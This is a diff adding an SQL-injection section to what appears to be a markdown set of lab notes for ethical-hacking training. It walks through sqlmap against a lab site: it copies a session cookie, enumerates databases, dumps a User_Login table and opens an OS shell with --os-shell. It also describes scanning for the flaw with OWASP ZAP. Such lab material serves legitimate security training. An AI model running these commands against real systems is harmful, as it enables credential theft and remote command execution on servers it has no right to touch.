@@ -1937,3 +1937,66 @@ To perform Web application fuzz testing using ShellGPT run sgpt --shell "Fuzz th
 
 ```
 </details>
+
+# SQL Injection
+<details>
+<summary>Perform an SQL injection attack against MSSQL to extract databases using sqlmap</summary>
+
+```console
+:~$parrot
+Navigate to http://www.moviescope.com/. A Login page loads; enter the Username and Password as sam and test,
+hit on view profile and make a note of url
+and then inspect the web page and console
+and then type document.cookie in left low corner >>
+copy the message
+and parrot cmd and type
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="cookie value that you copied" --dbs
+here -u > url
+and --dbs > enumerating dbms
+and move with Yes further
+and now we getting table information
+```
+```console
+:~$sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" -D moviescope --tables
+-D > enumerating DBMS
+--tables > enumerating tables inside db
+
+now to see the content inside the particular table
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" -D moviescope -T User_Login --dump 
+--dump > to dump the result
+```
+```console
+:~$ now to interact with os with shell
+
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" --os-shell
+enter "hostname"
+>to get name of the machine
+tasklist
+>to get the task details on the system
+help command for other cmds
+```
+</details>
+<details>
+<summary>Detect SQL Injection Vulnerabilities using Various SQL Injection Detection Tools</summary>
+
+* Detect SQL Injection Vulnerabilities using OWASP ZAP
+
+```console
+:~$ windows server 2019 machine
+search for zap in search bar
+no to radio button
+and start automated scan
+type url www.moviescope.com
+expand sql injection in alert tab
+and on right side it will show required info
+
+```
+</details>
+<details>
+<summary>Perform SQL Injection using AI</summary>
+
+```console
+:~$ ai commands
+```
+</details>
+
